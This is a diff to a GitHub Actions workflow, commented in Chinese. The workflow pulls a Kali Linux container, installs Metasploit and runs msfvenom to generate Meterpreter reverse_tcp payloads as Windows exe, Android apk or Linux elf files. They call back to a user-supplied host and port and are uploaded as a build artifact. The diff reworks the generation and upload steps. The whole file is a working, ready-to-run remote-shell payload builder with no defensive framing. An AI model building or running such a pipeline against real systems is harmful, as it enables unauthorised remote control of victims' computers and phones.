@@ -20,52 +20,63 @@ on:
         description: '输入监听端口'
         required: true
         default: '4444'
-      
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+      - name: Generate Payload using Kali Docker
+        run: |
+          # 拉取 Kali 镜像
+          docker pull kalilinux/kali-rolling
+          
+          # 根据用户选择的平台，设置 msfvenom 参数
+          case "${{ github.event.inputs.platform }}" in
+            "windows")
+              PAYLOAD="windows/x64/meterpreter/reverse_tcp"
+              EXT="exe"
+              FORMAT_FLAG="-f exe"
+              PLATFORM="" # 留空，windows不需要额外平台参数
+              ;;
+            "android")
+              PAYLOAD="android/meterpreter/reverse_tcp"
+              EXT="apk"
+              FORMAT_FLAG="" # apk格式不需要-f参数
+              PLATFORM="--platform android"
+              ;;
+            "linux")
+              PAYLOAD="linux/x64/meterpreter/reverse_tcp"
+              EXT="elf"
+              FORMAT_FLAG="-f elf"
+              PLATFORM=""
+              ;;
+            *)
+              echo "不支持的平台"
+              exit 1
+              ;;
+          esac
 
-    - name: Generate Payload using Kali Docker
-      run: |
-        # 拉取 Kali 镜像
-        docker pull kalilinux/kali-rolling
-        
-        # 根据用户选择的平台，映射对应的 msfvenom payload
-        case "${{ github.event.inputs.platform }}" in
-          "windows")
-            PAYLOAD="windows/x64/meterpreter/reverse_tcp"
-            EXT="exe"
-            EXTEND="-f exe"
-            ;;
-          "android")
-            PLATFORM="--platform android"
-            PAYLOAD="android/meterpreter/reverse_tcp"
-            EXT="apk"
-            ;;
-          "linux")
-            PAYLOAD="linux/x64/meterpreter/reverse_tcp"
-            EXT="elf"
-            EXTEND="-f elf"
-            ;;
-          *)
-            echo "不支持的平台"
-            exit 1
-            ;;
-        esac
+          # 生成文件名并保存到环境变量（在容器外部执行）
+          ENAME=$(cat /proc/sys/kernel/random/uuid)
+          echo "FILENAME=$ENAME" >> $GITHUB_ENV
+          echo "EXT=$EXT" >> $GITHUB_ENV
+          OUTPUT_FILE="/output/${ENAME}.${EXT}"
 
-        echo "正在生成 $PAYLOAD..."
-        echo "ENAME=$(cat /proc/sys/kernel/random/uuid)" >> $GITHUB_ENV
-        # 运行容器并生成 Payload
-        docker run --rm \
-          -v "${PWD}:/output" \
-          -u root \
-          kalilinux/kali-rolling \
-          bash -c "apt-get update && apt-get install -y metasploit-framework && msfvenom $PLATFORM -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} $EXTEND -o '/output/${{ env.ENAME }}.$EXT'"
-        
-    - name: Upload Payload
-      uses: actions/upload-artifact@v4
-      with:
-        name: Generated-Payload
-        path: ${{ env.ENAME }}.*
+          echo "正在生成载荷: $PAYLOAD"
+          echo "输出文件: $OUTPUT_FILE"
+
+          # 运行容器并生成 Payload
+          docker run --rm \
+            -v "${PWD}:/output" \
+            -u root \
+            kalilinux/kali-rolling \
+            bash -c "apt-get update && \
+                     apt-get install -y metasploit-framework && \
+                     msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
+
+      - name: Upload Payload
+        uses: actions/upload-artifact@v4
+        with:
+          name: Generated-Payload
+          # 拼接路径和文件名
+          path: ${{ env.FILENAME }}.${{ env.EXT }}
